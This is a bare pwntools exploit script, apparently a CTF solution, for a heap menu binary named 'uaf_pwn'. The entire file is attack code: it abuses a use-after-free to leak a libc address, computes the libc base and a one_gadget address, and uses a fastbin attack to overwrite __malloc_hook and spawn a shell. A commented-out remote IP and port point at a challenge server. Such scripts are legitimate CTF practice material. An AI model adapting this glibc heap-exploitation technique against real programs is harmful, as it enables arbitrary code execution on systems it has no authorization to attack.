from pwn import *
#ip = "82.157.5.28"
#port = 51002
#io = remote(ip,port)
io = process('./uaf_pwn')
elf = ELF('./uaf_pwn')
libc = elf.libc
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context(log_level='debug', os='linux', arch='amd64')
def choice(c):
 io.recvuntil(">")
 io.sendline(str(c))
def add(size):
 choice(1)
 io.recvuntil(">")
 io.sendline(str(size)) 
def free(index):
 choice(2)
 io.recvuntil(">")
 io.sendline(str(index))
def edit(index,content):
 choice(3)
 io.recvuntil(">")
 io.sendline(str(index))
 io.recvuntil(">")
 io.send(content) 
def show(index):
 choice(4)
 io.recvuntil(">")
 io.sendline(str(index))


add(0x100)#0
add(0x100)#1
#add(0x100)
gdb.attach(io)
free(0)


show(0)
#
leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
malloc_hook = leak - 88 - 0x10
libc_base = leak - 88 - 0x10 - libc.sym['__malloc_hook']

system = libc_base + libc.sym['system']
success(hex(system))
one = libc_base + 0x4527a
success(hex(leak))
success(hex(libc_base))
edit(0,"aaaa")
#gdb.attach(io)

add(0x60)#2

add(0x60)#3


free(2)
#gdb.attach(io)
edit(2,p64(malloc_hook - 0x10 - 0x10 - 3))
add(0x60)#4
add(0x60)#5

edit(5,b'A'*0x10 + b'A'*3 + p64(one))
gdb.attach(io)
add(0x60)
#free(4)
#free(4)
#

io.interactive()
